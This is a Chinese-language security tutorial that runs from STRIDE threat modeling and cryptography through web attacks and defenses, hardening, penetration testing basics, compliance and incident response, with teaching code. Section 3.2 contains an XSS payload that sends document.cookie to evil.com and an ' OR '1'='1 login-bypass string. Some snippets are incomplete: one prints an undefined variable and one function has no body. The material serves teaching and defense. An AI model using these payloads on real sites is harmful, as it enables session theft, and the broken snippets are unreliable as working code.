1.1 网络安全威胁模型（STRIDE）

威胁建模是"先想敌人会怎么攻击"：STRIDE 把威胁分成六类，逐类检查系统，比"出事再补"主动得多。

  • Spoofing 假冒：冒充他人身份（伪造 Token、越权登录）→ 靠认证解决
  • Tampering 篡改：篡改数据/消息（改订单金额、改包）→ 靠完整性/签名解决
  • Repudiation 抵赖：否认做过的事（不认账）→ 靠审计日志解决
  • Information Disclosure 泄露：敏感数据被看（数据泄露）→ 靠加密/授权解决
  • DoS 拒绝服务：系统不可用（流量攻击/资源耗尽）→ 靠限流/高可用解决
  • Elevation of Privilege 提权：普通用户获得管理员权限 → 靠最小权限/隔离解决
# 威胁建模清单（对每个组件过一遍 STRIDE）
组件：订单 API（接收用户下单请求）
S 假冒：攻击者伪造他人身份下单        → JWT 签名校验 + 会话绑定
T 篡改：拦截请求改商品价格            → 价格以服务端为准 + 请求签名
R 抵赖：用户否认下过单                → 订单操作审计日志
I 泄露：接口返回他人订单详情          → 对象级鉴权（IDOR 防护）
D 拒绝服务：刷接口拖垮服务            → 限流 + 熔断
E 提权：越权调用管理员接口            → 角色校验 + 最小权限

1.2 密码学基础（对称 / 非对称 / 哈希）

密码学三件套：对称加密快、适合加密数据；非对称加密用于密钥分发与签名；哈希用于完整性校验与口令存储（必须加盐）。

  • 对称加密：同一把密钥加解密；AES（AES-256-GCM 带认证）；快但密钥分发难
  • 非对称加密：公钥加密、私钥解密（RSA / ECC）；慢，用于握手交换对称密钥、数字签名
  • 哈希：SHA-256 单向不可逆；口令存储用 bcrypt / scrypt / argon2（加盐 + 慢哈希）
  • 组合实践：TLS = 非对称握手换密钥 + 对称加密传输 + 哈希/签名保完整
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
import os

# 1) 对称加密：AES-GCM（加密 + 认证）
key = AESGCM.generate_key(bit_length=256)
nonce = os.urandom(12)
ct = AESGCM(key).encrypt(nonce, b"订单金额 100 元", None)
plain = AESGCM(key).decrypt(nonce, ct, None)
print("AES 解密:", plain.decode())

# 2) 非对称：RSA 公钥加密私钥解密
sk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pk = sk.public_key()
cipher = pk.encrypt(b"secret", padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                                            algorithm=hashes.SHA256(), label=None))
print("RSA 解密:", sk.decrypt(cipher, padding.OAEP(
    mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode())

# 3) 哈希 + 盐（口令存储）：用 bcrypt（内置盐与慢哈希）

1.3 认证与授权的基本概念

认证（Authentication）回答"你是谁"，授权（Authorization）回答"你能干什么"。两者常被混用，但必须分开设计。

  • 认证方式：口令（加盐哈希）、双因素（2FA：口令 + TOTP）、SSO 单点登录、生物识别
  • 授权模型：RBAC（基于角色：用户→角色→权限）、ABAC（基于属性：年龄/部门条件）、ACL（访问控制列表）
  • 会话载体：服务端 Session（可吊销、占内存）vs 无状态 JWT（易扩展、难吊销）
  • 原则：默认拒绝、最小权限、权限校验在服务端而非前端
# 授权模型示例：RBAC 权限检查（服务端必须做）
ROLES = {
    "admin": {"order.delete", "user.manage", "order.view"},
    "user":  {"order.view"},
}

def has_perm(user, perm):
    return perm in ROLES.get(user["role"], set())

def delete_order(user, order_id):
    # 1) 认证：请求携带的凭证是否有效（JWT 验签）
    if not verify_token(user["token"]):
        raise PermissionError("未认证")
    # 2) 授权：是否有删除权限（RBAC）
    if not has_perm(user, "order.delete"):
        raise PermissionError("无权限")
    # 3) 对象级：只能删自己的单（IDOR 防护）
    order = db.get_order(order_id)
    if order["user_id"] != user["id"] and user["role"] != "admin":
        raise PermissionError("无权操作他人订单")
    db.delete(order_id)

2.1 Web 攻击与防御（XSS / CSRF / SQL 注入 / SSRF / 文件上传）

五大高频 Web 漏洞的攻防对应关系：攻击者注入"恶意输入"，防御者把"输入当数据、输出当代码"。

  • XSS：用户输入当 HTML/JS 执行（存储/反射/DOM）→ 输出编码（< → &lt;）+ CSP
  • CSRF：借已登录会话发恶意请求 → 同源校验 + CSRF Token + SameSite Cookie
  • SQL 注入：输入拼接进 SQL → 参数化查询（永远不拼字符串）
  • SSRF：服务端请求用户给的 URL（内网探测）→ 协议/白名单限制 + 禁止内网段
  • 文件上传：上传恶意文件（WebShell）→ 白名单扩展名 + 内容校验 + 存储与执行分离
# XSS 防御：输出编码
import html
user_input = "<script>alert(1)</script>"

print("前端展示:", safe)                        # 渲染为纯文本

2.2 身份认证方案（OAuth2 / JWT / Session）

三种主流方案：Session 有状态易吊销，JWT 无状态易扩展，OAuth2 解决"第三方授权"——按场景组合使用。

  • Session：登录后服务端存会话，客户端持 Cookie ID；可随时踢人，但多实例需共享存储（Redis）
  • JWT：三部分 Header.Payload.Signature；无状态、适合分布式；过期/吊销难，Access Token 短 + Refresh Token 换发
  • OAuth2：授权码流程（客户端 → 授权服务器 → 资源服务器）；用于"微信/Google 登录"第三方授权
  • 安全细节：Token 放 HttpOnly Cookie（防 XSS 偷）；refresh token 轮换；登录限流防爆破
import jwt, datetime

# JWT 签发与校验（pyjwt）
SECRET = "replace-with-strong-secret"

def issue_token(user_id, role, expire_min=30):
    payload = {
        "sub": user_id, "role": role,
        "iat": datetime.datetime.now(datetime.timezone.utc),
        "exp": datetime.datetime.now(datetime.timezone.utc)
              + datetime.timedelta(minutes=expire_min),
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

token = issue_token(42, "user")
print("JWT:", token[:40], "...")

def verify_token(token):
    try:
        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
        return payload                       # sub / role / exp
    except jwt.ExpiredSignatureError:
        return None                          # 过期 → 用 refresh token 换新
    except jwt.InvalidTokenError:
        return None                          # 伪造/篡改 → 拒绝

# OAuth2 授权码流程（第三方登录简化）：
# 1) 前端跳转：/oauth/authorize?client_id=APP&redirect_uri=CALLBACK&state=随机串
# 2) 用户同意 → 授权服务器带 code 回调
# 3) 后端拿 code + client_secret 换 access_token
# 4) 用 access_token 调用户信息接口 → 创建本系统会话

2.3 HTTPS 证书与 PKI 体系

HTTPS = HTTP + TLS：证书让客户端确认"服务端是真的"，加密保证传输不可窃听、不可篡改。PKI 是签发与信任证书的体系。

  • TLS 握手：客户端 Hello → 服务端证书 → 交换密钥（ECDHE）→ 对称加密通信
  • 证书链：根 CA → 中间 CA → 服务器证书；浏览器内置根证书信任链
  • 证书内容：域名（CN/SAN）、公钥、签发者、有效期、签名；Let's Encrypt 免费自动续期
  • Nginx 落地：443 监听 + 证书路径 + HTTP/2 + 跳转；TLS 1.2+，禁弱加密套件
# 自签证书（测试用）与 Nginx HTTPS 配置
# 1) 生成私钥 + 证书
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout server.key -out server.crt -days 365 -subj "/CN=example.com"

# 2) Nginx 配置
server {
    listen 443 ssl http2;
    server_name example.com;
    ssl_certificate     /etc/ssl/server.crt;
    ssl_certificate_key /etc/ssl/server.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    add_header Strict-Transport-Security "max-age=31536000" always;  # HSTS
    # 80 端口统一 301 跳转 https
}
server { listen 80; return 301 https://$host$request_uri; }

2.4 安全加固（基线 / 补丁管理）

加固 = 把系统默认配置改成"安全默认值"：最小端口、最小权限、及时补丁、日志留痕。攻击者进不来，进来了也难为所欲为。

  • 账号与权限：禁用 root 远程登录、sudo 最小化、密码策略 + 2FA
  • 网络面：只开必要端口、防火墙白名单、内网隔离、关闭不必要的服务
  • 系统基线：SSH 配置加固（禁密码登录）、文件权限（chmod/chown）、内核参数（防 SYN 洪水）
  • 补丁管理：OS/中间件/依赖定期升级（如 npm audit / pip-audit）、漏洞情报订阅
# Linux 加固清单（示例命令）
# 1) SSH：仅密钥登录，禁 root
sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# 2) 防火墙：只开 22/80/443
ufw allow 22/tcp && ufw allow 80/tcp && ufw allow 443/tcp
ufw deny 3306 && ufw enable

# 3) 文件权限：敏感配置 600，目录 700
chmod 600 /etc/ssl/server.key
chown -R www-data:www-data /var/www/app

# 4) 依赖漏洞扫描（CI 中加入）
npm audit --audit-level=high          # 前端依赖
pip-audit                             # Python 依赖
# 5) 自动补丁：unattended-upgrades / 容器镜像每周重建

2.5 安全测试基础（扫描 / 抓包）

安全测试在开发期就介入：静态扫描（SAST）查代码、动态扫描（DAST）测运行、抓包看流量、渗透测试模拟真攻击。

  • SAST 静态：扫源码找漏洞模式（Semgrep / CodeQL / Bandit），CI 集成，早发现
  • DAST 动态：对运行中的应用发恶意请求（OWASP ZAP / Acunetix），黑盒视角
  • 抓包：Burp Suite / Fiddler / mitmproxy 看与改请求，验证参数篡改风险
  • 扫描工具：Nmap（端口/服务探测）、Nuclei（模板化漏洞验证）

3.1 渗透测试流程与常用工具

渗透测试 = 有授权的模拟攻击：按标准流程推进（侦察 → 扫描 → 利用 → 后渗透 → 报告），用工具提高效率而非代替思考。

  • 流程五阶段：信息收集（侦察）→ 漏洞扫描 → 漏洞利用 → 后渗透（提权/横向）→ 报告与修复建议
  • 常用工具：Nmap（侦察）、Burp Suite（Web 抓包改包）、Metasploit（利用框架）、sqlmap（注入检测）、Hydra（口令爆破）
  • 合规前提：必须有书面授权（授权书/范围/时间窗）；未授权即违法
  • 测试类型：黑盒（无信息）、白盒（源码+配置）、灰盒（部分信息）

3.2 漏洞原理与利用分析

会防御更要懂原理：SQL 注入的根因是"输入与代码同流"，XSS 根因是"数据被当成脚本"，越权根因是"只校验了登录没校验归属"。

  • SQL 注入原理：输入拼进 SQL 改变语义（' OR '1'='1）；利用：绕过认证、拖库；防御：参数化 + 最小权限账号
  • XSS 原理：输出未编码，脚本进入 DOM；利用：偷 Cookie、钓鱼、键盘记录；防御：编码 + CSP
  • IDOR 越权：接口信任前端传的 id，未校验归属；利用：改 id 看他人数据；防御：对象级鉴权
  • 竞态漏洞：并发请求绕过检查（如重复领取）；利用：抢单/重复兑换；防御：数据库约束 + 幂等 + 乐观锁
# SQL 注入：原理演示（只用于教学理解，禁止实战）
# 输入：' OR '1'='1
# 拼出的 SQL：SELECT * FROM user WHERE name='' OR '1'='1'  → 恒真 → 绕过登录
# 正确做法：参数化（? 占位 + 传值），数据库把输入当数据而非 SQL

# XSS：原理演示
# 评论内容：<script>fetch('//evil.com?c='+document.cookie)</script>
# 服务端若原样返回并在页面插入 → 用户浏览器执行 → Cookie 被偷
# 防御：html.escape 后输出；设置 HttpOnly Cookie（JS 读不到）；CSP 限制脚本源

# IDOR：越权利用与修复
def get_order(user, order_id):

3.3 安全编码规范（输入校验 / 输出编码 / 最小权限）

安全编码三底线：输入校验（不信任任何外部输入）、输出编码（按上下文编码）、最小权限（默认拒绝）。放进 SDL 生命周期才不靠运气。

  • 输入校验：白名单优先（枚举/类型/长度/格式）、服务端校验（前端只是体验）、统一入口（框架过滤器）
  • 输出编码：HTML 上下文 <→&lt;、URL 编码、JSON 转义；CSP 兜底
  • 最小权限：数据库账号只给所需权限、密钥放环境变量、接口默认拒绝再按需放行
  • SDL 流程：需求（威胁建模）→ 设计（评审）→ 编码（规范+扫描）→ 测试（SAST/DAST）→ 上线（加固+监控）→ 运维（应急）
# 输入校验：白名单 + 服务端
import re

def validate_user_input(raw):
    errors = []
    # 类型/范围
    age = raw.get("age")
    if not isinstance(age, int) or not (0 < age < 150):
        errors.append("age 非法")
    # 白名单枚举
    if raw.get("role") not in {"user", "admin"}:
        errors.append("role 非法")
    # 长度与格式
    if not re.fullmatch(r"[A-Za-z0-9_-]{3,32}", raw.get("username", "")):
        errors.append("username 格式非法")
    return errors  # 非空则拒绝

3.4 密钥管理与数据加密落地

密钥是安全的核心资产：密钥不能写进代码，要集中管理（KMS/HSM）、定期轮换、按环境隔离；数据加密分传输、存储、字段三级。

  • 密钥管理：KMS（云厂商密钥服务）或自建 Vault；密钥轮换 + 版本管理；HSM 硬件保护根密钥
  • 传输加密：TLS 全链路（含内网服务间）；不用自研协议
  • 存储加密：数据库透明加密（TDE）、磁盘加密；备份也加密
  • 字段级加密：身份证/手机号等敏感字段应用层加密（AES-GCM），密钥在 KMS

3.5 等保合规与数据隐私（GDPR 简述）

合规是底线：等保 2.0 按等级做安全建设，数据隐私以"最小收集 + 用户授权 + 可删除"为核心原则。

  • 等保 2.0：等保定级（一至五级）→ 备案 → 建设整改 → 测评 → 监督检查；不同等级对应不同安全要求
  • GDPR 原则：合法正当透明、目的限制、数据最小化、准确性、存储限制、完整保密
  • 用户权利：知情同意、访问权、更正权、删除权（被遗忘权）、可携权
  • 落地动作：数据分类分级、隐私政策、同意管理、PII 脱敏、跨境评估、DDoS/日志留存
# 数据分类分级 + PII 脱敏（落地示例）
import re

# 1) 数据分类分级：标识敏感字段
PII_FIELDS = {"id_card", "phone", "email", "address"}

def classify_schema(columns):
    return {c: ("PII" if c in PII_FIELDS else "普通") for c in columns}

# 2) 脱敏：按字段类型
def mask(value, field):
    if field == "phone":
        return value[:3] + "****" + value[-4:]          # 138****1234
    if field == "id_card":
        return value[:4] + "**********" + value[-4:]     # 1101********1234
    if field == "email":
        name, dom = value.split("@")
        return name[0] + "***@" + dom
    return "***"

3.6 安全应急响应

应急响应 = 出事后"止血、取证、根除、复盘"：准备阶段把流程演练熟，事件阶段按剧本走，别在恐慌中乱操作。

  • 准备：应急预案 + 联系表、日志全量留存（攻击者会删日志）、备份隔离
  • 检测：告警（IDS/WAF/异常登录）、日志分析找 IoC（异常 IP/命令/文件）
  • 抑制：先止血——断外网、踢会话、改密钥、封禁 IP，再取证
  • 根除恢复：清除后门（找持久化：crontab/启动项/WebShell）、从干净备份恢复、打补丁
  • 复盘：时间线、根因、改进项；更新预案与监控规则
# 应急响应常用命令（检测 → 抑制 → 根除）
# 1) 检测：找异常会话与后门
who; last -a                            # 当前登录/历史登录
ss -tunap | grep -E 'ESTAB|LISTEN'      # 异常外连/监听端口
crontab -l; ls -la /etc/cron*           # 计划任务后门
find / -name '*.php' -newer /etc/passwd 2>/dev/null  # 新出现的 WebShell
history; cat ~/.bash_history            # 攻击者执行过的命令

# 2) 抑制：先止血
systemctl stop nginx                    # 断开服务（必要时）
pkill -f 'reverse|tunnel'               # 杀反弹 shell
iptables -A INPUT -s 1.2.3.4 -j DROP    # 封禁攻击 IP
# 修改全部口令/密钥，踢会话：kill -HUP 1 或逐 session 清理

# 3) 根除恢复：清后门 → 打补丁 → 从干净备份恢复 → 复检
# 4) 复盘：写时间线报告（何时·何入·何损·何改），更新预案

6常见误区与实战要点

  • 前端隐藏按钮 = 安全：接口不校验等于开门迎客；权限必须服务端校验，前端只是体验
  • HTTPS 了就是安全的：TLS 只保传输；应用层漏洞（XSS/注入/越权）照样打，还要防证书过期与配置错误
  • 哈希 = 加密：哈希不可逆，只能验完整性/存口令（加盐）；数据需要还原时必须用对称加密
  • JWT 放 localStorage 没问题：XSS 能直接偷走；放 HttpOnly Cookie + SameSite 更安全
  • 扫描器没扫出问题 = 安全：业务逻辑漏洞（越权/竞态/逻辑缺陷）扫描器看不见，要人工测
  • SQL 注入"少见了"：ORM 默认参数化，但手写 SQL / 拼接排序字段等场景仍可能注入
  • 密钥写配置文件没关系：代码仓库泄漏 = 密钥泄漏；用 KMS/Vault + 环境变量注入
  • 被打了先删日志：日志是取证关键，先隔离取证再清理；删除证据可能违法
  • 补丁 = 重启即安全：补丁要验证（不破坏业务）、要覆盖全资产（服务器/容器/依赖），还要防"补了没生效"
